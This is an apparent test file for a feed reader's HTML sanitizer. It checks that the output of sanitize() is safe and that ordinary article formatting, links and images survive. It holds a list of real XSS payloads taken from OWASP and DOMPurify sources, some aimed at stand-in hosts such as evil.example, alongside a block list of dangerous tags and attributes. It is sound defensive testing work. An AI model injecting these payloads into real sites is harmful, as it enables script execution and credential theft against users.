import { describe, expect, test } from "bun:test";
import { JSDOM } from "jsdom";
import { sanitize } from "./sanitize";

const { window } = new JSDOM("");
const clean = (html: string, images = false) =>
	sanitize(html, window, { base: "https://blog.example/post/1", images });

const ALLOWED_URL = /^(https?:|mailto:)/;
const DANGEROUS_TAGS = [
	"script",
	"style",
	"iframe",
	"frame",
	"object",
	"embed",
	"form",
	"input",
	"button",
	"textarea",
	"meta",
	"base",
	"link",
	"svg",
	"math",
	"video",
	"audio",
	"template",
	"noscript",
];

/** Parse the output again and check it structurally, not just as text. */
function assertSafe(out: string): void {
	const doc = new JSDOM(`<body>${out}</body>`).window.document;
	for (const el of doc.body.querySelectorAll("*")) {
		expect(DANGEROUS_TAGS).not.toContain(el.tagName.toLowerCase());
		for (const attr of el.attributes) {
			expect(attr.name).not.toStartWith("on");
			expect([
				"style",
				"srcset",
				"formaction",
				"action",
				"ping",
				"srcdoc",
				"xlink:href",
			]).not.toContain(attr.name);
			if (["href", "src", "cite", "data-fread-src"].includes(attr.name))
				expect(attr.value).toMatch(ALLOWED_URL);
		}
	}
	expect(out.toLowerCase()).not.toContain("javascript:");
	expect(out.toLowerCase()).not.toContain("vbscript:");
}

// Payloads from the OWASP XSS filter evasion cheat sheet, DOMPurify's mXSS tests, and feed-specific tricks.
const PAYLOADS = [
	"<script>alert(1)</script>",
	"<SCRIPT SRC=https://evil.example/x.js></SCRIPT>",
	"<img src=x onerror=alert(1)>",
	'<img src="javascript:alert(1)">',
	"<IMG SRC=JaVaScRiPt:alert('XSS')>",
	'<a href="javascript:alert(1)">x</a>',
	'<a href="jav&#x09;ascript:alert(1)">x</a>',
	'<a href=" javascript:alert(1)">x</a>',
	'<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
	'<a href="vbscript:msgbox(1)">x</a>',
	'<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
	'<a href="https://ok.example" onclick="alert(1)" ping="https://track.example">x</a>',
	"<svg onload=alert(1)><circle r=1></circle></svg>",
	'<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
	"<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
	'<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
	"<iframe src=https://evil.example></iframe>",
	'<iframe srcdoc="<script>alert(1)</script>"></iframe>',
	'<object data="javascript:alert(1)"></object>',
	'<embed src="https://evil.example/x.swf">',
	'<form action="https://evil.example"><input name="password"><button formaction="javascript:alert(1)">go</button></form>',
	'<div style="background:url(javascript:alert(1))">x</div>',
	"<style>@import 'https://evil.example/x.css'; body{display:none}</style>",
	'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
	'<base href="https://evil.example/">',
	'<link rel="stylesheet" href="https://evil.example/x.css">',
	'<img srcset="https://track.example/1x.png 1x" src="https://ok.example/a.png">',
	'<video poster="https://track.example/p.png"><source src="https://evil.example/v.mp4"></video>',
	"<template><script>alert(1)</script></template>",
	'<p data-fread-src="javascript:alert(1)" data-x="1">x</p>',
	'<details open ontoggle="alert(1)"><summary>x</summary></details>',
	"<body onload=alert(1)>",
	"<<script>script>alert(1)<</script>/script>",
];

describe("blocks known attack payloads", () => {
	for (const payload of PAYLOADS) {
		test(payload, () => {
			assertSafe(clean(payload));
			assertSafe(clean(payload, true));
		});
	}
});

describe("keeps the article", () => {
	test("formatting, safe links, and relative URLs", () => {
		const out = clean(
			'<h2>Hi</h2><p>Read <a href="../2">the next post</a> or <a href="mailto:me@blog.example">mail</a>.</p><pre><code>x &lt; 1</code></pre>',
		);
		expect(out).toContain("<h2>Hi</h2>");
		expect(out).toContain('href="https://blog.example/2"');
		expect(out).toContain('target="_blank"');
		expect(out).toContain('rel="noopener noreferrer nofollow"');
		expect(out).toContain('href="mailto:me@blog.example"');
		expect(out).toContain("<pre><code>x &lt; 1</code></pre>");
	});

	test("images wait until asked, so reading contacts no one but the feed", () => {
		const off = clean('<img src="/img/a.png" alt="A chart">');
		expect(off).not.toContain(" src=");
		expect(off).toContain('data-fread-src="https://blog.example/img/a.png"');
		expect(off).toContain('alt="A chart"');
		const on = clean('<img src="/img/a.png" alt="A chart">', true);
		expect(on).toContain('src="https://blog.example/img/a.png"');
		expect(on).toContain('referrerpolicy="no-referrer"');
	});
});
